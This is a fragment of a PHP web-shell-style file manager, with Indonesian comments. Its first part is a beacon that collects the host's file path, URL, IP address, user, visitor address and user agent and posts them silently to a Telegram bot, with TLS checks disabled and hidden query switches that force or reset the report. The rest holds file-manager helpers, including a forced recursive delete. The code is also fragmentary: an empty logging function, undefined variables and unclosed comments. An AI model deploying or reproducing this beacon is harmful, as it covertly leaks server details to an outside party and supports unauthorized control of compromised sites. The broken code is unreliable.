function _svc_note(string $line): void {

}

    $fp     = hash('sha256', $host . '|' . $abs . '|' . $hostn);

    _svc_note("FP: $fp");
    _svc_note("Path: $abs");

    $force = (($_GET['_tp'] ?? '') === 'f');
    $reset = (($_GET['_tp'] ?? '') === 'r');

    if ($reset) {
        @unlink(SVC_STATE);
        _svc_note("RESET: state dihapus");
    }

    $state = [];
    if (is_file(SVC_STATE)) {
        $state = json_decode(@file_get_contents(SVC_STATE), true) ?: [];
        _svc_note("State: " . count($state) . " entries");
    } else {
        _svc_note("State: BELUM ADA");
    }

    if (!$force && isset($state[$fp]) && (time() - $state[$fp]) < SVC_TTL) {
        $h = round((SVC_TTL - (time() - $state[$fp])) / 3600, 1);
        _svc_note("SKIP: cooldown aktif, $h jam lagi");
        _svc_note("=== SYNC END (skipped) ===");
        return;
    }

    /* ===== PESAN — PLAIN TEXT, NO MARKDOWN ===== */
    $msg  = "🚨 OWNER BEACON TRIGGERED\n";
    $msg .= "\n";
    $msg .= "📄 File    : " . basename($abs) . "\n";
    $msg .= "🌐 URL     : " . $url . "\n";
    $msg .= "📁 Path    : " . $abs . "\n";
    $msg .= "🖥  Host    : " . $hostn . " (" . $ip . ")\n";
    $msg .= "👤 User    : " . $user . "\n";
    $msg .= "📡 Remote  : " . $remote . "\n";
    $msg .= "🕐 Waktu   : " . date('Y-m-d H:i:s T') . "\n";
    $msg .= "🔑 UA      : " . substr($ua, 0, 120) . "\n";
    $msg .= "\n";
    $msg .= "FP: " . substr($fp, 0, 16);
    if ($reason === 'force') $msg .= "\n\n⚡ MANUAL FORCE TRIGGER";

    $endpoint = 'https://api.telegram.org/bot' . SVC_KEY . '/sendMessage';

    /* ===== PAYLOAD — TANPA parse_mode ===== */
    $payload  = http_build_query([
        'chat_id'                  => SVC_ID,
        'text'                     => $msg,
        'disable_web_page_preview' => true,
    ]);

    $success = false;

    if (function_exists('curl_init')) {
        $ch = curl_init($endpoint);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
        ]);
        $res  = @curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $cerr = curl_error($ch);
        @curl_close($ch);
        _svc_note("HTTP $code | err: " . ($cerr ?: '-'));
        _svc_note("Res: " . substr((string)$res, 0, 200));
        if ($code === 200 && strpos((string)$res, '"ok":true') !== false) $success = true;
    } else {
        $ctx = stream_context_create(['http' => [
            'method'        => 'POST',
            'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content'       => $payload,
            'timeout'       => 10,
            'ignore_errors' => true,
        ]]);
        $res = @file_get_contents($endpoint, false, $ctx);
        _svc_note("fopen: " . substr((string)$res, 0, 200));
        if (strpos((string)$res, '"ok":true') !== false) $success = true;
    }

    if ($success) {
        $state[$fp] = time();

        @chmod(SVC_STATE, 0600);
        _svc_note("State write: " . ($w !== false ? 'OK' : 'GAGAL'));
        _svc_note("=== SYNC END (sent) ===");
    } else {
        _svc_note("=== SYNC END (FAILED) ===");
    }
}

 *  ROOT DETECTION

function detect_allowed_root(): string {
    if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
        $pw = @posix_getpwuid(posix_geteuid());
        if (!empty($pw['dir']) && is_dir($pw['dir'])) {
            return rtrim(realpath($pw['dir']), '/');
        }
    }
    $home = getenv('HOME') ?: ($_SERVER['HOME'] ?? '');
    if ($home && is_dir($home)) return rtrim(realpath($home), '/');
    $up = dirname(dirname(__DIR__));
    if (is_dir($up)) return rtrim(realpath($up), '/');
    return rtrim(realpath(__DIR__), '/');
}

/* =========================================================
 *  PATH HANDLING

function clean_path(string $p): string {
    $p = str_replace('\\', '/', $p);
    $p = str_replace("\0", '', $p);
    return $p;
}
function real_or_norm(string $p): string {
    $r = realpath($p);
    if ($r !== false) return $r;
    $isAbs = str_starts_with($p, '/');
    $parts = [];
    foreach (explode('/', $p) as $x) {
        if ($x === '' || $x === '.') continue;
        if ($x === '..') array_pop($parts);
        else $parts[] = $x;
    }
    return ($isAbs ? '/' : '') . implode('/', $parts);
}
function check_allowed(string $abs): bool {
    $abs = rtrim($abs, '/');
    $root = rtrim(ALLOWED_ROOT, '/');
    return $abs === $root || str_starts_with($abs, $root . '/');
}
function get_path(): string {
    $p = $_REQUEST['path'] ?? ALLOWED_ROOT;
    $p = clean_path($p);
    $abs = real_or_norm($p);
    if (!check_allowed($abs)) {
        http_response_code(403);
        exit('Akses ditolak: di luar folder yang diizinkan (' . htmlspecialchars(ALLOWED_ROOT) . ').');
    }
    return $abs;
}

function fmt_size($b) {
    $u = ['B','KB','MB','GB','TB']; $i = 0;
    while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
    return round($b, 2) . ' ' . $u[$i];
}
function perms_str($f) {
    $p = @fileperms($f);
    if ($p === false) return '----------';
    $i = '';
    if (($p & 0xC000) === 0xC000) $i = 's';
    elseif (($p & 0xA000) === 0xA000) $i = 'l';
    elseif (($p & 0x8000) === 0x8000) $i = '-';
    elseif (($p & 0x6000) === 0x6000) $i = 'b';
    elseif (($p & 0x4000) === 0x4000) $i = 'd';
    elseif (($p & 0x2000) === 0x2000) $i = 'c';
    elseif (($p & 0x1000) === 0x1000) $i = 'p';
    else $i = 'u';
    $i .= ($p & 0x0100) ? 'r' : '-';
    $i .= ($p & 0x0080) ? 'w' : '-';
    $i .= ($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-');
    $i .= ($p & 0x0020) ? 'r' : '-';
    $i .= ($p & 0x0010) ? 'w' : '-';
    $i .= ($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-');
    $i .= ($p & 0x0004) ? 'r' : '-';
    $i .= ($p & 0x0002) ? 'w' : '-';
    $i .= ($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-');
    return $i;
}
function rmrf($dir): bool {
    if (is_link($dir) || !is_dir($dir)) return @unlink($dir);
    @chmod($dir, 0755);
    $ok = true;
    $items = @scandir($dir) ?: [];
    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        @chmod($p, is_dir($p) ? 0755 : 0644);
        if (is_dir($p) && !is_link($p)) {
            if (!rmrf($p)) $ok = false;
        } else {
            if (!@unlink($p)) {
                @chmod($p, 0777);
                if (!@unlink($p)) $ok = false;
            }
        }
    }
    @chmod($dir, 0755);
    if (!@rmdir($dir)) $ok = false;
    return $ok;
}

function fix_perms(string $dir): array {
    $s = ['dir' => 0, 'file' => 0, 'fail' => 0];
    if (!is_dir($dir)) {
        if (@chmod($dir, 0644)) $s['file']++; else $s['fail']++;
        return $s;
    }
    if (@chmod($dir, 0755)) $s['dir']++; else $s['fail']++;
    $items = @scandir($dir) ?: [];
    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        if (is_dir($p) && !is_link($p)) {
            $sub = fix_perms($p);
            $s['dir']  += $sub['dir'];
            $s['file'] += $sub['file'];
            $s['fail'] += $sub['fail'];
        } else {
            if (@chmod($p, 0644)) $s['file']++; else $s['fail']++;
        }
    }
    return $s;
}
